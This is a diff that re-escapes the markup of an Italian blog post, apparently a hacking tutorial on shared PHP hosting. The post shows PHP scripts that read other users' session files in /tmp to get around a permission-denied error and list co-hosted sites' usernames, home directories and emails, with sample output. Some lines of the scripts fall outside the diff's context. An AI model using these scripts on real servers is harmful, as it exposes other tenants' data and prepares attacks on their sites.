@@ -9,36 +9,28 @@ Ed eccoci in un altro articolo che, come il <a href="http://www.evilsocket.net/2
 Abbiamo parlato della /tmp, dei file di sessione e di come manipolarli per i nostri (loschi) scopi, ora vedremo come superare dei permessi restrittivi che non ci consentono di elencare le home directory (quindi le cartelle htdocs) degli altri utenti sul nostro server.
 
 Prima di tutto, sul nostro sito eseguiamo lo script che segue per determinare in che cartella ci troviamo:
-<pre>
-  <code>
-    &lt;?php
+<pre><pre><code>    <?php
       die(getcwd());
-    ?&gt;
-  </code>
-</pre>
+    ?></pre></code></pre>
 
 <break>
 
 Il che ci restituirà una stringa del tipo '/home/www/nostrosito.com' ... proviamo ora ad enumerare gli altri siti/utenti nella cartella /home/www come si farebbe normalmente in PHP:
 
-<pre>
-  <code>
-&lt;?php
+<pre><pre><code><?php
     if ($handle = opendir('/home/www/')) {
         while (false !== ($file = readdir($handle))) {
-            if ($file != "." &amp;&amp; $file != "..") {
+            if ($file != "." && $file != "..") {
                 echo "$file\n";
             }
         }
         closedir($handle);
     }
-?&gt;
-  </code>
-</pre>
+?></pre></code></pre>
 
 Ed indovinate un po? Ci troveremo davanti l'errore:
 
-<pre><code>Warning: opendir(/home/www/) [function.opendir]: failed to open dir: Permission denied in /home/www/nostrosito.com/prova.php on line 5</code></pre>
+<pre><pre><code>Warning: opendir(/home/www/) [function.opendir]: failed to open dir: Permission denied in /home/www/nostrosito.com/prova.php on line 5</pre></code></pre>
 
 Uuuuuu che cattivoni! A noi quel Permission denied non piace per niente vero? :P
 
@@ -50,9 +42,7 @@ Bene! Sfruttiamo la /tmp ed i file di sessione nel seguente modo:
 	<li>Il gioco è fatto</li>
 </ul>
 Lo script è il seguente:
-<pre>
-  <code>
-  &lt;?php
+<pre><pre><code>  <?php
     $files = glob( "/tmp/sess_*" );
     $users = array();
     foreach( $files as $file ){
@@ -63,41 +53,35 @@ Lo script è il seguente:
       }
       
     foreach( $users as $user ){
-      $info = str_replace( ' ', '&amp;nbsp;', print_r($user,true) );
+      $info = str_replace( ' ', '&nbsp;', print_r($user,true) );
       echo nl2br($info);
     }
-?&gt;
-  </code>
-</pre>
+?></pre></code></pre>
 
 Ed avremo la nostra bella lista, del tipo:
-<pre>
-  <code>
-  Array
+<pre><pre><code>  Array
   (
-    [name] =&gt; pierino.it
-    [passwd] =&gt; *
-    [uid] =&gt; 52417
-    [gid] =&gt; 52417
-    [gecos] =&gt; pierino.it@pierino.it
-    <strong> [dir] =&gt; /home/www/pierino.it </strong>
-    [shell] =&gt; /bin/true
+    [name] => pierino.it
+    [passwd] => *
+    [uid] => 52417
+    [gid] => 52417
+    [gecos] => pierino.it@pierino.it
+    <strong> [dir] => /home/www/pierino.it </strong>
+    [shell] => /bin/true
   )
 
   Array
   (
-    [name] =&gt; foobar.com
-    [passwd] =&gt; *
-    [uid] =&gt; 61240
-    [gid] =&gt; 61240
-    [gecos] =&gt; foobar.com@foobar.com
-    <strong> [dir] =&gt; /home/www/foobar.com </strong>
-    [shell] =&gt; /bin/true
+    [name] => foobar.com
+    [passwd] => *
+    [uid] => 61240
+    [gid] => 61240
+    [gecos] => foobar.com@foobar.com
+    <strong> [dir] => /home/www/foobar.com </strong>
+    [shell] => /bin/true
   )
 
-  ...
-  </code>
-</pre>
+  ...</pre></code></pre>
 
 Bingoooo, ecco la lista degli utenti apache e delle rispettive home directory / htdocs (cazzio pure le email :D) ... come si diceva?
 <br>
